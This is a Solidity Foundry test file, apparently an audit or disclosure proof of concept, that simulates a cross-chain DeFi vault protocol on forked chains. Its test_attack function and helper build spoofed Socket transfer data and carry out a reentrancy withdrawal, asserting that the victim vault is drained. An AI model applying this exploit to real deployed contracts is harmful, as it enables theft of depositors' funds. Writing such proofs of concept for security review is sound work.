// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

// Contracts
import {Attack} from "contracts/attack/Attack.sol";
import "contracts/types/socketTypes.sol";
import "contracts/types/lzTypes.sol";

// Test Utils
import {MockERC20} from "./mocks/MockERC20.sol";
import "./utils/BaseSetup.sol";

/*//////////////////////////////////////////////////////////////
                        MAIN TEST VARS
//////////////////////////////////////////////////////////////*/

struct TestProtocolVars {
    Vm.Log[] logs;
    StateReq[] stateReqs;
    LiqRequest[] liqReqs;
    StateReq stateReq;
    LiqRequest liqReq;
    MockERC20 TARGET_VAULT;
    uint256 vault;
    uint256 amountsToDeposit;
    uint256 CHAIN_0_PAYLOAD_ID;
    uint256 CHAIN_1_PAYLOAD_ID;
    uint256 sharesBalanceBeforeWithdraw;
    uint256 amountsToWithdraw;
    address user;
    address vaultMock;
    address underlyingSrcToken;
    address underlyingDstToken;
    address payable fromSrc;
    address payable toDst;
}

/*//////////////////////////////////////////////////////////////
            VARS FOR THE ATTACK SPECIFIC PURPOSE
//////////////////////////////////////////////////////////////*/

struct BuildAttackArgs {
    address attackingContract;
    address fromSrc;
    address toDst;
    address underlyingDstToken;
    uint256 targetVaultId;
    uint256 amount;
    uint256 msgValue;
    uint16 srcChainId;
    uint16 toChainId;
}

struct TestAttackVars {
    Vm.Log[] logs;
    StateReq[] stateReqs;
    LiqRequest[] liqReqs;
    StateReq stateReq;
    LiqRequest liqReq;
    MockERC20 VICTIM_VAULT;
    uint256 victimVault;
    uint256 amountsToDeposit;
    uint256 CHAIN_0_PAYLOAD_ID;
    uint256 CHAIN_1_PAYLOAD_ID;
    uint256 sharesBalanceBeforeWithdraw;
    uint256 assetsToStealEachLoop;
    address vaultMock;
    address underlyingSrcToken;
    address underlyingDstToken;
    address payable fromSrc;
    address payable toDst;
}

contract BaseProtocolTest is BaseSetup {
    Attack internal attackCHAIN_0;
    Attack internal attackCHAIN_1;

    string UNDERLYING_TOKEN;
    string VAULT_NAME;

    /// @dev reference for chain ids https://layerzero.gitbook.io/docs/technical-reference/mainnet/supported-chain-ids
    uint16 constant ETH = 101;
    uint16 constant BNB = 102;
    uint16 constant AVAX = 106;
    uint16 constant POLY = 109;
    uint16 constant ARBI = 110;
    uint16 constant OP = 111;
    uint16 constant FTM = 112;

    address constant ETH_lzEndpoint =
        0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    address constant BNB_lzEndpoint =
        0x3c2269811836af69497E5F486A85D7316753cf62;
    address constant AVAX_lzEndpoint =
        0x3c2269811836af69497E5F486A85D7316753cf62;
    address constant POLY_lzEndpoint =
        0x3c2269811836af69497E5F486A85D7316753cf62;
    address constant ARBI_lzEndpoint =
        0x3c2269811836af69497E5F486A85D7316753cf62;
    address constant OP_lzEndpoint = 0x3c2269811836af69497E5F486A85D7316753cf62;
    address constant FTM_lzEndpoint =
        0x3c2269811836af69497E5F486A85D7316753cf62;

    string ETHEREUM_RPC_URL = vm.envString("ETHEREUM_RPC_URL");
    string BSC_RPC_URL = vm.envString("BSC_RPC_URL");
    string AVALANCHE_RPC_URL = vm.envString("AVALANCHE_RPC_URL");
    string POLYGON_RPC_URL = vm.envString("POLYGON_RPC_URL");
    string ARBITRUM_RPC_URL = vm.envString("ARBITRUM_RPC_URL");
    string OPTIMISM_RPC_URL = vm.envString("OPTIMISM_RPC_URL");
    string FANTOM_RPC_URL = vm.envString("FANTOM_RPC_URL");

    address lzEndpoint_0;
    address lzEndpoint_1;
    uint16 CHAIN_0;
    uint16 CHAIN_1;
    string RPC_URL0;
    string RPC_URL1;

    function setUp() public override {
        super.setUp();
        /*//////////////////////////////////////////////////////////////
                    !! WARNING !!  DEFINE TEST SETTINGS HERE
        //////////////////////////////////////////////////////////////*/

        UNDERLYING_TOKEN = "DAI";
        VAULT_NAME = string.concat(UNDERLYING_TOKEN, "Vault");
        lzEndpoint_0 = ETH_lzEndpoint;
        lzEndpoint_1 = POLY_lzEndpoint;
        CHAIN_0 = ETH;
        CHAIN_1 = POLY;
        RPC_URL0 = ETHEREUM_RPC_URL;
        RPC_URL1 = POLYGON_RPC_URL;

        /*//////////////////////////////////////////////////////////////
                    !! WARNING !!  PROTOCOL DEPLOYMENT
        //////////////////////////////////////////////////////////////*/

        /// @dev Call deploy protocol with intended src and dst chains for simulation
        _deployProtocol(
            RPC_URL0,
            RPC_URL1,
            lzEndpoint_0,
            lzEndpoint_1,
            CHAIN_0,
            CHAIN_1,
            UNDERLYING_TOKEN
        );

        /*//////////////////////////////////////////////////////////////
                        REMAINDER OF YOUR TEST CASES
        //////////////////////////////////////////////////////////////*/

        /// @dev deploy attacking contract on src and dst chain
        address payable chain0_SuperRouter = payable(
            getContract(CHAIN_0, "SuperRouter")
        );

        address payable chain1_StateHandler = payable(
            getContract(CHAIN_1, "StateHandler")
        );

        address payable chain1_SuperDestination = payable(
            getContract(CHAIN_1, "SuperDestination")
        );

        address chain1_TOKEN = getContract(CHAIN_1, UNDERLYING_TOKEN);

        address chain1_TOKENVault = getContract(CHAIN_1, VAULT_NAME);

        vm.selectFork(FORKS[CHAIN_0]);
        vm.startPrank(deployer);

        attackCHAIN_0 = new Attack(
            chain0_SuperRouter,
            chain1_StateHandler,
            chain1_SuperDestination,
            chain1_TOKEN,
            chain1_TOKENVault
        );

        MockERC20 chain0_TOKEN = MockERC20(
            super.getContract(CHAIN_0, UNDERLYING_TOKEN)
        );

        chain0_TOKEN.transfer(address(attackCHAIN_0), milionTokensE18 / 100);

        vm.selectFork(FORKS[CHAIN_1]);

        attackCHAIN_1 = new Attack(
            chain0_SuperRouter,
            chain1_StateHandler,
            chain1_SuperDestination,
            chain1_TOKEN,
            chain1_TOKENVault
        );

        vm.stopPrank();
    }

    /*///////////////////////////////////////////////////////////////
                        Unit tests: Showcase
    //////////////////////////////////////////////////////////////*/

    function test_deposit() public {
        TestProtocolVars memory vars;

        vars.vault = 1; // should correspond to UNDERLYING_TOKEN vault
        vars.amountsToDeposit = 1000;
        vars.CHAIN_0_PAYLOAD_ID;
        vars.CHAIN_1_PAYLOAD_ID;
        vars.underlyingSrcToken = getContract(CHAIN_0, UNDERLYING_TOKEN);
        vars.underlyingDstToken = getContract(CHAIN_1, UNDERLYING_TOKEN);
        vars.user = users[0];

        vars.fromSrc = payable(getContract(CHAIN_0, "SuperRouter"));
        vars.toDst = payable(getContract(CHAIN_1, "SuperDestination"));

        /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
        (vars.stateReq, vars.liqReq) = _buildDepositCallData(
            vars.fromSrc,
            vars.toDst,
            vars.underlyingSrcToken,
            vars.vault,
            vars.amountsToDeposit,
            1 ether,
            CHAIN_0,
            CHAIN_1
        );

        vars.TARGET_VAULT = MockERC20(getContract(CHAIN_1, UNDERLYING_TOKEN));
        vm.selectFork(FORKS[CHAIN_1]);
        assertEq(
            vars.TARGET_VAULT.balanceOf(
                getContract(CHAIN_1, "SuperDestination")
            ),
            0
        );

        _depositToVault(
            DepositArgs(
                vars.underlyingSrcToken,
                vars.fromSrc,
                vars.toDst,
                lzEndpoint_1,
                vars.user,
                vars.stateReq,
                vars.liqReq,
                vars.amountsToDeposit,
                CHAIN_0,
                CHAIN_1
            )
        );

        vm.selectFork(FORKS[CHAIN_1]);
        assertEq(
            vars.TARGET_VAULT.balanceOf(vars.toDst),
            vars.amountsToDeposit
        );

        /// @dev code block for updating state and syncing messages
        {
            unchecked {
                vars.CHAIN_1_PAYLOAD_ID++;
            }
            _updateState(
                vars.CHAIN_1_PAYLOAD_ID,
                vars.amountsToDeposit,
                CHAIN_1
            );

            vm.recordLogs();
            _processPayload(vars.CHAIN_1_PAYLOAD_ID, CHAIN_1);

            vars.logs = vm.getRecordedLogs();
            LayerZeroHelper(getContract(CHAIN_1, "LayerZeroHelper"))
                .helpWithEstimates(
                    lzEndpoint_0,
                    1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                    FORKS[CHAIN_0],
                    vars.logs
                );

            unchecked {
                vars.CHAIN_0_PAYLOAD_ID++;
            }
            _processPayload(vars.CHAIN_0_PAYLOAD_ID, CHAIN_0);
        }

        vm.selectFork(FORKS[CHAIN_0]);
        assertEq(
            SuperRouter(vars.fromSrc).balanceOf(vars.user, 1),
            vars.amountsToDeposit
        );

        vars.vaultMock = getContract(CHAIN_1, VAULT_NAME);
        vm.selectFork(FORKS[CHAIN_1]);
        assertEq(
            VaultMock(vars.vaultMock).balanceOf(vars.toDst),
            vars.amountsToDeposit
        );
    }

    function test_deposit_and_withdrawal() public {
        TestProtocolVars memory vars;

        vars.vault = 1; // should correspond to TOKEN vault
        vars.amountsToDeposit = 1000;
        vars.CHAIN_0_PAYLOAD_ID;
        vars.CHAIN_1_PAYLOAD_ID;
        vars.underlyingSrcToken = getContract(CHAIN_0, UNDERLYING_TOKEN);
        vars.underlyingDstToken = getContract(CHAIN_1, UNDERLYING_TOKEN);
        vars.user = users[0];

        vars.fromSrc = payable(getContract(CHAIN_0, "SuperRouter"));
        vars.toDst = payable(getContract(CHAIN_1, "SuperDestination"));

        /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
        (vars.stateReq, vars.liqReq) = _buildDepositCallData(
            vars.fromSrc,
            vars.toDst,
            vars.underlyingSrcToken,
            vars.vault,
            vars.amountsToDeposit,
            1 ether,
            CHAIN_0,
            CHAIN_1
        );

        vars.TARGET_VAULT = MockERC20(getContract(CHAIN_1, UNDERLYING_TOKEN));
        vm.selectFork(FORKS[CHAIN_1]);
        assertEq(
            vars.TARGET_VAULT.balanceOf(
                getContract(CHAIN_1, "SuperDestination")
            ),
            0
        );

        _depositToVault(
            DepositArgs(
                vars.underlyingSrcToken,
                vars.fromSrc,
                vars.toDst,
                lzEndpoint_1,
                vars.user,
                vars.stateReq,
                vars.liqReq,
                vars.amountsToDeposit,
                CHAIN_0,
                CHAIN_1
            )
        );

        vm.selectFork(FORKS[CHAIN_1]);
        assertEq(
            vars.TARGET_VAULT.balanceOf(vars.toDst),
            vars.amountsToDeposit
        );

        /// @dev code block for updating state and syncing messages
        {
            unchecked {
                vars.CHAIN_1_PAYLOAD_ID++;
            }
            _updateState(
                vars.CHAIN_1_PAYLOAD_ID,
                vars.amountsToDeposit,
                CHAIN_1
            );

            vm.recordLogs();
            _processPayload(vars.CHAIN_1_PAYLOAD_ID, CHAIN_1);

            vars.logs = vm.getRecordedLogs();
            LayerZeroHelper(getContract(CHAIN_1, "LayerZeroHelper"))
                .helpWithEstimates(
                    lzEndpoint_0,
                    1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                    FORKS[CHAIN_0],
                    vars.logs
                );

            unchecked {
                vars.CHAIN_0_PAYLOAD_ID++;
            }
            _processPayload(vars.CHAIN_0_PAYLOAD_ID, CHAIN_0);
        }

        vm.selectFork(FORKS[CHAIN_0]);
        assertEq(
            SuperRouter(vars.fromSrc).balanceOf(vars.user, 1),
            vars.amountsToDeposit
        );

        vars.vaultMock = getContract(CHAIN_1, VAULT_NAME);
        vm.selectFork(FORKS[CHAIN_1]);
        assertEq(
            VaultMock(vars.vaultMock).balanceOf(vars.toDst),
            vars.amountsToDeposit
        );

        /// @dev Withdrawal -------------------------
        vm.selectFork(FORKS[CHAIN_0]);

        vars.sharesBalanceBeforeWithdraw = SuperRouter(vars.fromSrc).balanceOf(
            vars.user,
            1
        );
        vm.selectFork(FORKS[CHAIN_1]);

        vars.amountsToWithdraw = VaultMock(vars.vaultMock).previewRedeem(
            vars.sharesBalanceBeforeWithdraw
        );

        (vars.stateReq, vars.liqReq) = _buildWithdrawCallData(
            BuildWithdrawArgs(
                vars.fromSrc,
                vars.toDst,
                vars.underlyingSrcToken,
                vars.vault,
                vars.amountsToWithdraw,
                10 ether,
                CHAIN_0,
                CHAIN_1
            )
        );

        _withdrawFromVault(
            WithdrawArgs(
                vars.fromSrc,
                vars.toDst,
                lzEndpoint_1,
                vars.user,
                vars.stateReq,
                vars.liqReq,
                vars.amountsToWithdraw,
                CHAIN_0,
                CHAIN_1
            )
        );

        vars.CHAIN_1_PAYLOAD_ID++;
        _processPayload(vars.CHAIN_1_PAYLOAD_ID, CHAIN_1);
    }

    function test_attack_contract_same_address() public {
        assertEq(address(attackCHAIN_0), address(attackCHAIN_1));
    }

    /*///////////////////////////////////////////////////////////////
                        Unit tests: Attack
    //////////////////////////////////////////////////////////////*/

    /// @dev This is a test of an end to end possible attack. Testing individual parts (unit tests) can be taken from here
    function test_attack() public {
        TestAttackVars memory vars;

        vars.victimVault = 1; // should correspond to TOKEN vault
        vars.amountsToDeposit = 1000;
        vars.CHAIN_0_PAYLOAD_ID;
        vars.CHAIN_1_PAYLOAD_ID;
        vars.underlyingSrcToken = getContract(CHAIN_0, UNDERLYING_TOKEN);
        vars.underlyingDstToken = getContract(CHAIN_1, UNDERLYING_TOKEN);

        vars.fromSrc = payable(getContract(CHAIN_0, "SuperRouter"));
        vars.toDst = payable(getContract(CHAIN_1, "SuperDestination"));

        /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
        (vars.stateReq, vars.liqReq) = _buildDepositCallData(
            vars.fromSrc,
            vars.toDst,
            vars.underlyingSrcToken,
            vars.victimVault,
            vars.amountsToDeposit,
            1 ether,
            CHAIN_0,
            CHAIN_1
        );

        vars.VICTIM_VAULT = MockERC20(getContract(CHAIN_1, UNDERLYING_TOKEN));
        vm.selectFork(FORKS[CHAIN_1]);
        assertEq(
            vars.VICTIM_VAULT.balanceOf(
                getContract(CHAIN_1, "SuperDestination")
            ),
            0
        );

        /// @dev fund the vault with 10000 TOKEN
        for (uint256 i = 0; i < users.length; i++) {
            _depositToVault(
                DepositArgs(
                    vars.underlyingSrcToken,
                    vars.fromSrc,
                    vars.toDst,
                    lzEndpoint_1,
                    users[i],
                    vars.stateReq,
                    vars.liqReq,
                    vars.amountsToDeposit,
                    CHAIN_0,
                    CHAIN_1
                )
            );
        }

        vm.selectFork(FORKS[CHAIN_1]);
        assertEq(
            vars.VICTIM_VAULT.balanceOf(vars.toDst),
            vars.amountsToDeposit * users.length
        );

        /// @dev Update state on src and dst and process payload on dst
        /// @notice this will mint to the users the super positions
        for (uint256 i = 0; i < users.length; i++) {
            unchecked {
                vars.CHAIN_1_PAYLOAD_ID++;
            }
            _updateState(
                vars.CHAIN_1_PAYLOAD_ID,
                vars.amountsToDeposit,
                CHAIN_1
            );

            vm.recordLogs();
            _processPayload(vars.CHAIN_1_PAYLOAD_ID, CHAIN_1);

            vars.logs = vm.getRecordedLogs();
            LayerZeroHelper(getContract(CHAIN_1, "LayerZeroHelper"))
                .helpWithEstimates(
                    lzEndpoint_0,
                    1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                    FORKS[CHAIN_0],
                    vars.logs
                );

            unchecked {
                vars.CHAIN_0_PAYLOAD_ID++;
            }

            _processPayload(vars.CHAIN_0_PAYLOAD_ID, CHAIN_0);

            vm.selectFork(FORKS[CHAIN_0]);
            assertEq(
                SuperRouter(vars.fromSrc).balanceOf(users[i], 1),
                vars.amountsToDeposit
            );
        }

        vars.vaultMock = getContract(CHAIN_1, VAULT_NAME);
        vm.selectFork(FORKS[CHAIN_1]);
        assertEq(
            VaultMock(vars.vaultMock).balanceOf(vars.toDst),
            vars.amountsToDeposit * users.length
        );

        /// @dev Step 1 - deposit from the source attacker contract
        /// @dev Attack starts from the attacking contract which is the 'user'
        /// @dev Notice no parameters are changed here from the same kind of requests the other users did
        vars.stateReqs = new StateReq[](1);
        vars.liqReqs = new LiqRequest[](1);

        vars.stateReqs[0] = vars.stateReq;
        vars.liqReqs[0] = vars.liqReq;

        vm.selectFork(FORKS[CHAIN_0]);
        vm.prank(deployer);
        attackCHAIN_0.depositIntoRouter{value: 2 ether}(
            vars.liqReqs,
            vars.stateReqs
        );
        vars.logs = vm.getRecordedLogs();
        LayerZeroHelper(getContract(CHAIN_0, "LayerZeroHelper"))
            .helpWithEstimates(
                lzEndpoint_1,
                1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                FORKS[CHAIN_1],
                vars.logs
            );

        vars.CHAIN_1_PAYLOAD_ID++;
        _updateState(vars.CHAIN_1_PAYLOAD_ID, vars.amountsToDeposit, CHAIN_1);

        _processPayload(vars.CHAIN_1_PAYLOAD_ID, CHAIN_1);

        vars.logs = vm.getRecordedLogs();
        LayerZeroHelper(getContract(CHAIN_1, "LayerZeroHelper"))
            .helpWithEstimates(
                lzEndpoint_0,
                1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                FORKS[CHAIN_0],
                vars.logs
            );

        vars.CHAIN_0_PAYLOAD_ID++;
        _processPayload(vars.CHAIN_0_PAYLOAD_ID, CHAIN_0);
        vars.sharesBalanceBeforeWithdraw = SuperRouter(vars.fromSrc).balanceOf(
            address(attackCHAIN_0),
            1
        );
        assertEq(vars.sharesBalanceBeforeWithdraw, vars.amountsToDeposit);

        /// @dev Step 2 - Attacker previews how many assets he will be stealing from the vault in each reentrancy
        // Specifically he could choose to do  BscVaultBalanceAtBeginningOfAttack/sharesBalanceBeforeWithdraw (rounded down) reentrancies

        vm.selectFork(FORKS[CHAIN_1]);

        vars.assetsToStealEachLoop = VaultMock(vars.vaultMock).previewRedeem(
            vars.sharesBalanceBeforeWithdraw
        );

        /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
        (vars.stateReq, vars.liqReq) = _buildWithdrawAttackCallData(
            BuildAttackArgs(
                address(attackCHAIN_1),
                vars.fromSrc,
                vars.toDst,
                vars.underlyingSrcToken,
                vars.victimVault,
                vars.amountsToDeposit,
                10 ether,
                CHAIN_0,
                CHAIN_1
            )
        );
        vars.stateReqs[0] = vars.stateReq;
        vars.liqReqs[0] = vars.liqReq;
        /// @dev airdrop 99 Native tokens to socket in both chain
        vm.startPrank(deployer);

        vm.selectFork(FORKS[CHAIN_0]);
        payable(getContract(CHAIN_0, "SocketRouterMockFork")).transfer(
            99 ether
        );

        vm.selectFork(FORKS[CHAIN_1]);
        payable(getContract(CHAIN_1, "SocketRouterMockFork")).transfer(
            99 ether
        );

        vm.stopPrank();

        /// @dev Step 3 - A normal withdrawal from the SourceChain is inititated by the attacker contract
        /// @dev This chain is where the SuperPositions are stored
        vm.selectFork(FORKS[CHAIN_0]);
        vm.prank(deployer);
        attackCHAIN_0.withdrawFromRouter{value: 10 ether}(
            vars.liqReqs,
            vars.stateReqs
        );
        vars.logs = vm.getRecordedLogs();
        LayerZeroHelper(getContract(CHAIN_0, "LayerZeroHelper"))
            .helpWithEstimates(
                lzEndpoint_1,
                1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                FORKS[CHAIN_1],
                vars.logs
            );

        /// @dev Step 4 - Reentrancy
        vars.CHAIN_1_PAYLOAD_ID++;
        _processPayload(vars.CHAIN_1_PAYLOAD_ID, CHAIN_1);

        vm.selectFork(FORKS[CHAIN_1]);
        /// @dev WARNING - Asserts vault in chain1 has been drained
        assertEq(VaultMock(vars.vaultMock).balanceOf(vars.toDst), 0);
    }

    /*//////////////////////////////////////////////////////////////
                        HELPER FUNCTION
    //////////////////////////////////////////////////////////////*/

    function _buildWithdrawAttackCallData(BuildAttackArgs memory args)
        internal
        view
        returns (StateReq memory stateReq, LiqRequest memory liqReq)
    {
        /// @dev set to empty bytes for now
        bytes memory adapterParam;

        /// @dev only testing 1 vault at a time for now
        uint256[] memory amountsToDeposit = new uint256[](1);
        uint256[] memory targetVaultIds = new uint256[](1);
        uint256[] memory slippage = new uint256[](1);

        amountsToDeposit[0] = args.amount;
        targetVaultIds[0] = args.targetVaultId;
        slippage[0] = 1000;

        stateReq = StateReq(
            args.toChainId,
            amountsToDeposit,
            targetVaultIds,
            slippage,
            adapterParam,
            args.msgValue
        );

        /// @dev ! Notice - A new mock functon mockSocketTransferNative was added to the socket contract to allow this
        /// @dev ! Notice - This is valid because socket allows swaps between Token -> Native Currency in the same destination chain
        /// @dev ! Notice - without breaking the chain of call (DEX Swap)
        bytes memory spoofedTxData = abi.encodeWithSignature(
            "mockSocketTransferNative(address,address,address,uint256,uint256)",
            args.toDst,
            args.attackingContract, /// @dev <--- Attacker contract address in the destination chain replaces the destination of the socket transfer.
            args.underlyingDstToken,
            args.amount,
            FORKS[args.toChainId]
        );

        liqReq = LiqRequest(
            1,
            spoofedTxData,
            args.underlyingDstToken,
            getContract(args.srcChainId, "SocketRouterMockFork"),
            args.amount,
            0
        );
    }
}
